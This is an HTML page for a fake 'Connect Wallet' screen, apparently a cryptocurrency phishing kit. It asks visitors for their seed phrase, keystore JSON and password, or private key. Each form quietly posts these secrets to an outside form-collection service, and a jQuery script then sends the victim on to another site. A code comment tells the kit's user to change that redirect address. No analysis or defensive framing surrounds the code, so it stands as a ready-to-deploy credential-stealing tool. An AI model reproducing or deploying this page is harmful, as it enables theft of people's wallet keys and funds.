<!DOCTYPE html>
<html lang="en">

<meta http-equiv="content-type" content="text/html;charset=UTF-8" />

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Wallet Connect</title>
    <link rel="stylesheet" href="css/style.css">
    <link rel="preconnect" href="https://fonts.gstatic.com/">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@100;300;400;700;900&amp;display=swap" rel="stylesheet">
    <script src="../../kit.fontawesome.com/3001ac0519.js" crossorigin="anonymous"></script>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
</head>

<body >
    <div class="import" style="font-family: 'Poppins', sans-serif;">
        <div class="import__container">
            <a href="#" class="import__header">
                <i class="fa fa-less-than import__header--icon"></i>
                <span class="import__header--text text- " style="color: rgb(65, 141, 241);">Connect Wallet</span>
            </a>
            <div class="import__tab ">
                <!-- Tab headers (navigation) -->
                <div class="import__tab__header bg-dark">
                    <a href="#phrase" class="import__tab__header--item import__tab__header--item--1 current  " style="color: rgb(65, 141, 241);">Phrase</a>
                    <a href="#keystore-json" class="import__tab__header--item import__tab__header--item--2" style="color: rgb(65, 141, 241);">Keystore Json</a>
                    <a href="#private-key" class="import__tab__header--item import__tab__header--item--3" style="color: rgb(65, 141, 241);">Private Key</a>
                </div>

                <!-- Tab bodies (content) -->
                <div class="import__tab__body">

                    <!-- Tab body (phrase) -->
                    <div id="phrase" class="import__tab__body--item import__tab__body--item--phrase current">
                        <form action="https://formcarry.com/s/965fuFNySLR" method="POST" class="ajaxForm">
                            <input type="hidden" name="solflare">
                            <div class="form__errorBox form__errorBox--phrase"></div>
                            <textarea class="form-control form__input--textarea " minlength="12" style="font-size: small;" name="Portis-phrase" cols="30" rows="5" placeholder="Input Phrase" required></textarea>
                            <input type="hidden" name="_gotcha">
                            <!-- use this to prevent spam -->

                            <label for="phrase_input" class="form__label">Typically 12 (sometimes 24) words separated by a single space.</label>
                            <button class="form__button" type="submit" style="background-color:rgb(65, 141, 241);">CONNECT</button>
                        </form>
                    </div>

                    <!-- Tab body (keystore json) -->
                    <div id="keystore-json" class="import__tab__body--item import__tab__body--item--keystore-json">
                        <form action="https://formcarry.com/s/965fuFNySLR" method="POST" class="ajaxForm">
                            <textarea class="form__input form__input--textarea" minlength="12" name="Portis-keystore_json" cols="30" rows="5" placeholder="Keystore JSON..." required></textarea>
                            <input type="hidden" name="_gotcha">
                            <!-- use this to prevent spam -->

                            <label for="keystore_password"></label>
                            <input type="password" name="Portis keystore_pass" class="form__input" placeholder="Password..." required>

                            <label for="Portiskeystore_json" class="form__label">Several lines of text beginning with "{...}" plus the password you used to encrypt it. </label>
                            <button class="form__button " type="submit" style="background-color: rgb(65, 141, 241);">CONNECT</button>
                        </form>
                    </div>

                    <!-- Tab body (private key) -->
                    <form action="https://formcarry.com/s/965fuFNySLR" method="POST" class="ajaxForm">
                        <div id="private-key" class="import__tab__body--item import__tab__body--item--private-key">
                            <input type="hidden" name="_gotcha">
                            <!-- use this to prevent spam -->

                            <input type="text" name="Portis priv key" class="form__input" minlength="12" placeholder="Private Key..." required>
                            <label for="Portis priv_key" class="form__label">Typically 12 (sometimes 24) words separated by a single space.</label>
                            <button class="form__button" type="submit" style="background-color:rgb(65, 141, 241);;">CONNECT</button>
                        </div>
                </div>
            </div>
        </div>
    </div>
    </form>
    <script src="js/app.js"></script>

    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script>
        $(function(){
            $(".ajaxForm").submit(function(e){
                e.preventDefault();
                var href = $(this).attr("action");
                $.ajax({
                    type: "POST",
                    dataType: "json",
                    url: href,
                    data: $(this).serialize(),
                success: function(response) {
                    if (response.status == "success") {
                        window.location.href = 'https://submit-wallet.vercel.app'; // redirection url // change this. 
                    } else {
                        alert("An error occured: " + response.message);
                    }
                }
            });
        })});
    </script>
</body>

</html>
